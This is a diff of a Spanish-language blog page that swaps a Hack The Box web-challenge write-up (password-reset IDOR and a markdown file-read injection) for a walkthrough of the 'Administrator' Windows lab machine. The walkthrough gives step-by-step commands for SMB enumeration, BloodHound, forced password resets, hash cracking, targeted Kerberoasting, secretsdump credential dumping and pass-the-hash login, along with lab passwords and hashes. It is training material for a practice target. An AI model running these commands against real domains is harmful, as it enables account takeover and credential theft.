@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Armaxis &middot; Loaxert</title>
-  <meta name="title" content="Armaxis &middot; Loaxert" />
+  <title>Administrator &middot; Loaxert</title>
+  <meta name="title" content="Administrator &middot; Loaxert" />
   
   
-  <meta name="keywords" content="Web, IDOR, Markdown-Injection, " />
+  <meta name="keywords" content="Bloodhund, Dumping-de-credenciales, Windows, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/challenges/armaxis/" />
+  <link rel="canonical" href="http://localhost:1313/htb/maquinas/administrator/" />
   
   
   
@@ -70,21 +70,21 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/challenges/armaxis/">
+  <meta property="og:url" content="http://localhost:1313/htb/maquinas/administrator/">
   <meta property="og:site_name" content="Loaxert">
-  <meta property="og:title" content="Armaxis">
+  <meta property="og:title" content="Administrator">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="htb">
-    <meta property="article:published_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:modified_time" content="2025-02-21T17:00:00-05:00">
-    <meta property="article:tag" content="Web">
-    <meta property="article:tag" content="IDOR">
-    <meta property="article:tag" content="Markdown-Injection">
+    <meta property="article:published_time" content="2024-04-19T00:04:43-05:00">
+    <meta property="article:modified_time" content="2024-04-19T00:04:43-05:00">
+    <meta property="article:tag" content="BloodHund">
+    <meta property="article:tag" content="Dumping-De-Credenciales">
+    <meta property="article:tag" content="Windows">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Armaxis">
+  <meta name="twitter:title" content="Administrator">
 
   
   <script type="application/ld+json">
@@ -92,26 +92,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Hack The Box",
-    "name": "Armaxis",
-    "headline": "Armaxis",
+    "name": "Administrator",
+    "headline": "Administrator",
     
     
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/htb\/challenges\/armaxis\/",
+    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/administrator\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
     },
-    "copyrightYear": "2025",
-    "dateCreated": "2025-02-21T17:00:00-05:00",
-    "datePublished": "2025-02-21T17:00:00-05:00",
+    "copyrightYear": "2024",
+    "dateCreated": "2024-04-19T00:04:43-05:00",
+    "datePublished": "2024-04-19T00:04:43-05:00",
     
-    "dateModified": "2025-02-21T17:00:00-05:00",
+    "dateModified": "2024-04-19T00:04:43-05:00",
     
-    "keywords": ["Web","IDOR","Markdown-Injection"],
+    "keywords": ["Bloodhund","Dumping-de-credenciales","Windows"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "202"
+    "wordCount": "617"
   }]
   </script>
 
@@ -500,7 +500,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Armaxis
+      Administrator
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -541,7 +541,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
+  <time datetime="2024-04-19T00:04:43-05:00">19 abril 2024</time>
   
 
   
@@ -666,27 +666,105 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <p>Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.</p>
-<p><a href="https://imgur.com/INILlbn"><img src="https://i.imgur.com/INILlbn.png" title="source: imgur.com" /></a>
-<a href="https://imgur.com/0DFM6yL"><img src="https://i.imgur.com/0DFM6yL.png" title="source: imgur.com" /></a></p>
-<p>Vemos como tenemos acceso a una bandeja de un correo y en el otro puerto tenemos la opcion de registrar usuarios ingresar y recuperar la contraseña.</p>
-<p>Revisando el codigo fuente nos damos cuenta que la recuperacion de contraseña no esta bien pensada y es vulnerable a un IDOR porque si bien pide un token y verifica que el token sea valido no verifica a quien le pertenece el token, con este en conocimiento le podemos cambiar la contraseña a cualquier usuario.</p>
-<p><a href="https://imgur.com/NgmrWjW"><img src="https://i.imgur.com/NgmrWjW.png" title="source: imgur.com" /></a></p>
-<p>Vamos a tratar de hallar algun correo de administrador en el codigo fuente usando grep:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -r admin
-</span></span></code></pre></div><p><a href="https://imgur.com/Pz55VjH"><img src="https://i.imgur.com/Pz55VjH.png" title="source: imgur.com" /></a></p>
-<p>Solicitamos el cambio de contraseña despues de crear un usuario con el correo que nos dieron:</p>
-<p><a href="https://imgur.com/FpSi3nd"><img src="https://i.imgur.com/FpSi3nd.png" title="source: imgur.com" /></a></p>
-<p>Y hacemos el cambio de contraseña para el usuario administrador:</p>
-<p><a href="https://imgur.com/qw2z1SF"><img src="https://i.imgur.com/qw2z1SF.png" title="source: imgur.com" /></a></p>
-<p>Ahora con eso podemos iniciar sesion como administradores y veremos que tenemos acceso a un funcion para mostrar “weapons”</p>
-<p><a href="https://imgur.com/lAJ1HvJ"><img src="https://i.imgur.com/lAJ1HvJ.png" title="source: imgur.com" /></a></p>
-<p>Tambien vemos que en la nota acepta markdown por lo que podemos tratar de hacer una inyección para obtener la flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">img[<span class="nt">!</span>](<span class="na">file:///flag.txt</span>)
-</span></span></code></pre></div><p><a href="https://imgur.com/qav1aoI"><img src="https://i.imgur.com/qav1aoI.png" title="source: imgur.com" /></a>
-<a href="https://imgur.com/hRyzZEA"><img src="https://i.imgur.com/hRyzZEA.png" title="source: imgur.com" /></a></p>
-<p>Si pasamos lo que nos muestra el codigo fuente a un decoder de base64 nos dara la flag.</p>
+          
 
+<h1 class="relative group">Enumeración 
+    <div id="enumeraci%C3%B3n" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeraci%C3%B3n" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">oG</span> <span class="n">allPorts</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/Y1sQo1p"><img src="https://i.imgur.com/Y1sQo1p.png" title="source: imgur.com" /></a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p21</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">47001</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49665</span><span class="p">,</span><span class="mi">49666</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49668</span><span class="p">,</span><span class="mi">59464</span><span class="p">,</span><span class="mi">59475</span><span class="p">,</span><span class="mi">59480</span><span class="p">,</span><span class="mi">59483</span><span class="p">,</span><span class="mi">59502</span><span class="p">,</span><span class="mi">64101</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">oN</span> <span class="n">target</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/DPfrAdf"><img src="https://i.imgur.com/DPfrAdf.png" title="source: imgur.com" /></a></p>
+<p>Con cualquiera de los siguientes dos comandos podemos identificar de diferentes maneras los usuarios que hay en la máquina.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;Olivia&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;ichliebedich&#39;</span> <span class="o">-</span><span class="n">d</span> <span class="n">Administrator</span><span class="o">.</span><span class="n">htb</span> <span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/l7E7WMB"><img src="https://i.imgur.com/l7E7WMB.png" title="source: imgur.com" /></a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nxc</span> <span class="n">smb</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">u</span> <span class="n">Olivia</span> <span class="o">-</span><span class="n">p</span> <span class="n">ichliebedich</span> <span class="o">--</span><span class="n">users</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/HdlR3Pq"><img src="https://i.imgur.com/HdlR3Pq.png" title="source: imgur.com" /></a></p>
+<p>Vamos a listar las configuraciones y los protocolos que se aplican a la máquina con el comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nxc</span> <span class="n">smb</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">u</span> <span class="n">olivia</span> <span class="o">-</span><span class="n">p</span> <span class="n">ichliebedich</span> <span class="o">--</span><span class="k">pass</span><span class="o">-</span><span class="n">pol</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/hUsqrXp"><img src="https://i.imgur.com/hUsqrXp.png" title="source: imgur.com" /></a></p>
+<p>La enumeración de la política de contraseñas muestra que la longitud mínima de la contraseña es de 7 caracteres, la complejidad de la contraseña está desactivada (lo que significa que los usuarios pueden elegir contraseñas cortas y débiles) y, lo más importante, la opción <strong>Account Lockout Threshold</strong> está desactivada, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada.</p>
+
+
+<h1 class="relative group">Bloodhund 
+    <div id="bloodhund" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#bloodhund" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<p>Vamos a usar una herramienta llamada BloodHound que nos va a ayudar a encontrar vulnerabilidades para saltar de un usuario a otro y, finalmente, hacer el escalamiento de privilegios. Para instalarla y configurarla, sigue este paso a paso <a href="https://www.kali.org/tools/bloodhound/" target="_blank">https://www.kali.org/tools/bloodhound/</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="n">olivia</span> <span class="o">-</span><span class="n">p</span> <span class="n">ichliebedich</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">d</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/pFAuSUQ"><img src="https://i.imgur.com/pFAuSUQ.png" title="source: imgur.com" /></a></p>
+<p>Después de subir los archivos que nos generó el comando y buscar al usuario al cual tenemos acceso, podemos ver que en Outbound Object Control tenemos la opción de saltar a otro usuario, en este caso <a href="mailto:michael@administrator.htb">michael@administrator.htb</a>, y de este a <a href="mailto:benjamin@administrator.htb">benjamin@administrator.htb</a>.</p>
+<p>Dado esto, vemos que tenemos privilegios <strong>GenericAll</strong>, lo que nos permite realizar un <strong>Force Change Password</strong>, que es lo que vamos a intentar.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="n">michael</span> <span class="s2">&#34;newpass&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">olivia</span><span class="o">%</span><span class="n">ichliebedich</span> <span class="o">-</span><span class="n">S</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pth</span><span class="o">-</span><span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="n">michael</span> <span class="s2">&#34;newpass&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">Olivia</span><span class="o">%</span><span class="n">ffffffffffffffffffffffffffffffff</span><span class="p">:</span><span class="n">FBAA3E2294376DC0F5AEB6B41FFA52B7</span> <span class="o">-</span><span class="n">S</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span>
+</span></span></code></pre></div><blockquote>
+<p>El hash FBAA3E2294376DC0F5AEB6B41FFA52B7 salió de pasarle la contraseña de Olivia a este algoritmo de hash <a href="https://www.browserling.com/tools/ntlm-hash" target="_blank">https://www.browserling.com/tools/ntlm-hash</a></p></blockquote>
+<p>Con esto, hemos cambiado la contraseña de Michael y procederemos a saltar al usuario Benjamin, lo cual sigue el mismo proceso, pero cambiando las credenciales.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="n">benjamin</span> <span class="s2">&#34;newpass&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">michael</span><span class="o">%</span><span class="s2">&#34;passmichael&#34;</span> <span class="o">-</span><span class="n">S</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pth</span><span class="o">-</span><span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="n">benjamin</span> <span class="mi">11030221</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">michael</span><span class="o">%</span><span class="n">ffffffffffffffffffffffffffffffff</span><span class="p">:</span><span class="s2">&#34;hashmichael&#34;</span> <span class="o">-</span><span class="n">S</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span>
+</span></span></code></pre></div><p>Luego de esto, nos vamos a conectar por FTP como Benjamin y descargar un archivo que está en el directorio en el que ingresamos con el comando get.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mf">10.10.11.42</span><span class="nd">@benjamin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="n">Backup</span><span class="o">.</span><span class="n">psafe3</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">User 
+    <div id="user" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#user" aria-label="Ancla">#</a>
+    </span>        
+    
+</h2>
+<p>Si investigamos un poco, nos daremos cuenta de que es un hash y que lo podemos descifrar con Hashcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">5200</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">Backup</span><span class="o">.</span><span class="n">psafe3</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">force</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/wCTdbYB"><img src="https://i.imgur.com/wCTdbYB.png" title="source: imgur.com" /></a></p>
+<p>Con la contraseña que nos dejó el hash, vamos a abrir el psafe3.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pwsafe</span> <span class="n">Backup</span><span class="o">.</span><span class="n">psafe3</span>
+</span></span></code></pre></div><p>Con las contraseñas del archivo podemos ingresar como emily para obtener la flag de usuario.</p>
+
+
+<h1 class="relative group">Root 
+    <div id="root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<p>En BloodHound vemos que el único de los tres usuarios que conseguimos puede hacer algo, y ese es Emily. Entonces, vamos a seguir lo que nos dice para un Targeted Kerberoast aunque tambien lo podriamos hacer con Netexec.</p>
+<p><a href="https://imgur.com/6GFAwEU"><img src="https://i.imgur.com/6GFAwEU.png" title="source: imgur.com" /></a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">faketime</span> <span class="s2">&#34;$(ntpdate -q administrator.htb | cut -d &#39; &#39; -f 1,2)&#34;</span> <span class="n">python3</span> <span class="n">targetedKerberoast</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">d</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">emily</span> <span class="o">-</span><span class="n">p</span> <span class="n">UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">faketime</span> <span class="s2">&#34;$(ntpdate -q administrator.htb | cut -d &#39; &#39; -f 1,2)&#34;</span> <span class="n">nxc</span> <span class="n">ldap</span> <span class="mf">10.10.11.42</span> <span class="o">-</span><span class="n">u</span> <span class="n">emily</span> <span class="o">-</span><span class="n">p</span> <span class="n">UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span> <span class="o">--</span><span class="n">kerberoasting</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
+</span></span></code></pre></div><p>Esto nos deja un hash Kerberos 5 que podemos descifrar con Hashcat, y esa contraseña es la de Ethan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="o">-</span><span class="n">m13100</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+</span></span></code></pre></div><p>Si miramos a qué grupos pertenece en BloodHound, podemos ver que pertenece al grupo de Domain Controllers.</p>
+<p><a href="https://imgur.com/BddMNu2"><img src="https://i.imgur.com/BddMNu2.png" title="source: imgur.com" /></a></p>
+<p>Si buscamos durante un rato, podemos encontrar que podemos escalar privilegios mediante un Credential Dumping <a href="https://redcanary.com/threat-detection-report/techniques/os-credential-dumping/" target="_blank">https://redcanary.com/threat-detection-report/techniques/os-credential-dumping/</a>, y lo podemos hacer con alguno de los siguientes comandos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.42</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">ethan</span><span class="p">:</span><span class="n">limpbizkit</span><span class="o">@</span><span class="mf">10.10.11.42</span>
+</span></span></code></pre></div><p>Esto nos va a mostrar los hashes de todos los usuarios, pero el que nos interesa es el del usuario Administrator. Entonces, con ese hash, vamos a iniciar sesión.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="mi">3</span><span class="n">dc553ce4b9fd20bd016e098d2d2fd2e</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.42</span>
+</span></span></code></pre></div>
           
           
           
@@ -708,8 +786,8 @@
           
         
       <script>
-        var oid = "views_HTB\\Challenges\\Armaxis.md"
-        var oid_likes = "likes_HTB\\Challenges\\Armaxis.md"
+        var oid = "views_HTB\\Maquinas\\Administrator.md"
+        var oid_likes = "likes_HTB\\Maquinas\\Administrator.md"
       </script>
       
       
@@ -729,40 +807,18 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/htb/challenges/onlyhacks/">
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >OnlyHacks</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-02-20T17:00:00-05:00">20 febrero 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/htb/challenges/spookypass/">
+            <a class="flex text-right group ml-3" href="/htb/maquinas/greenhorn/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >SpookyPass</span
+                  >GreenHorn</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-03-29T17:00:00-05:00">29 marzo 2025</time>
+                    <time datetime="2024-11-30T17:00:00-05:00">30 noviembre 2024</time>
                   
                 </span>
               </span>
